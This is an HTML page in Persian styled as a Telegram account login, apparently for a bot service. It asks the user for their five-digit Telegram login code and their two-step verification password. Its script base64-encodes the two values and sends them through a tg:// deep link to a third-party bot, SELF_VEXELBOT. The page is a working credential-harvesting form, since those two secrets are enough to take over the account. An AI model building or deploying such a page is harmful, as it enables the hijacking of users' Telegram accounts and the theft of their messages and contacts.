<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ورود به اکانت</title>

    <!-- فونت وزیری -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@300;400;500;600;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --teal       : #0d9488;
            --teal-light : #14b8a6;
            --dark-gray  : #1f2937;
            --gray       : #374151;
            --light      : #f3f4f6;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Vazirmatn', sans-serif;
            background: linear-gradient(135deg, var(--dark-gray) 0%, #111827 100%);
            color: #e5e7eb;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(31, 41, 55, 0.95);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 40px 30px;
            width: 100%;
            max-width: 480px;
            text-align: center;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
            border: 1.5px solid rgba(13, 148, 136, 0.4);
        }

        h1 {
            font-size: 26px;
            color: var(--teal-light);
            margin-bottom: 30px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: right;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #d1d5db;
            font-size: 16px;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            border-radius: 12px;
            border: 1px solid #4b5563;
            background: #2d3748;
            color: white;
            font-size: 17px;
            text-align: center;
            transition: all 0.3s;
        }

        input:focus {
            outline: none;
            border-color: var(--teal);
            box-shadow: 0 0 0 3px rgba(13, 148, 136, 0.3);
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 10px;
            margin: 25px 0;
            font-size: 16px;
            color: #e5e7eb;
        }

        .checkbox-group input[type="checkbox"] {
            width: 20px;
            height: 20px;
            accent-color: var(--teal);
            cursor: pointer;
        }

        .password-field {
            display: none;
            margin-top: 20px;
            opacity: 0;
            transition: all 0.4s ease;
        }

        .password-field.show {
            display: block;
            opacity: 1;
        }

        .info-text {
            font-size: 15px;
            color: #9ca3af;
            margin: 30px 0 35px;
            line-height: 1.7;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 16px;
            background: var(--teal);
            color: white;
            font-size: 18px;
            font-weight: 600;
            border: none;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            box-shadow: 0 8px 25px rgba(13, 148, 136, 0.4);
        }

        .btn:hover {
            background: var(--teal-light);
            transform: translateY(-3px);
            box-shadow: 0 12px 30px rgba(13, 148, 136, 0.5);
        }

        @media (max-width: 480px) {
            .container { padding: 35px 20px; }
            h1 { font-size: 24px; }
            input { font-size: 16px; padding: 13px; }
            .btn { font-size: 17px; padding: 14px; }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>ورود به اکانت تلگرام</h1>

        <div class="form-group">
            <label for="code">کد ۵ رقمی ورود به تلگرام</label>
            <input type="text" id="code" maxlength="5" inputmode="numeric" placeholder="مثال: 12345" required>
        </div>

        <div class="checkbox-group">
            <label for="has2fa">اکانت من رمز دو مرحله‌ای دارد</label>
            <input type="checkbox" id="has2fa">
        </div>

        <div class="form-group password-field" id="passwordField">
            <label for="password">رمز دو مرحله‌ای</label>
            <input type="password" id="password" placeholder="رمز عبور خود را وارد کنید">
        </div>

        <p class="info-text">
            پس از زدن دکمه "ورود به اکانت"<br>
            به ربات باز خواهید گشت.
        </p>

        <a href="#" class="btn" id="loginBtn">ورود به اکانت</a>
    </div>

    <script>
        const has2faCheckbox = document.getElementById('has2fa');
        const passwordField = document.getElementById('passwordField');
        const codeInput = document.getElementById('code');
        const passwordInput = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');

        // نمایش/مخفی کردن فیلد رمز دو مرحله‌ای
        has2faCheckbox.addEventListener('change', function() {
            if (this.checked) {
                passwordField.classList.add('show');
                passwordInput.setAttribute('required', '');
            } else {
                passwordField.classList.remove('show');
                passwordInput.removeAttribute('required');
                passwordInput.value = '';
            }
        });

        // تولید لینک هنگام کلیک
        loginBtn.addEventListener('click', function(e) {
            e.preventDefault();

            let code = codeInput.value.trim();
            if (code.length !== 5 || !/^\d+$/.test(code)) {
                alert('لطفاً کد ۵ رقمی معتبر وارد کنید.');
                return;
            }

            let payload = code;

            if (has2faCheckbox.checked) {
                let pass = passwordInput.value.trim();
                if (pass === '') {
                    alert('رمز دو مرحله‌ای را وارد کنید.');
                    return;
                }
                payload = code + '-' + pass;
            }

            // تبدیل به Base64
            const base64 = btoa(unescape(encodeURIComponent(payload)));

            // لینک نهایی
            const telegramLink = `tg://resolve?domain=SELF_VEXELBOT&start=${base64}`;

            // باز کردن لینک تلگرام
            window.location.href = telegramLink;
        });

        // فقط اعداد در کد ۵ رقمی
        codeInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
        });
    </script>

</body>
</html>
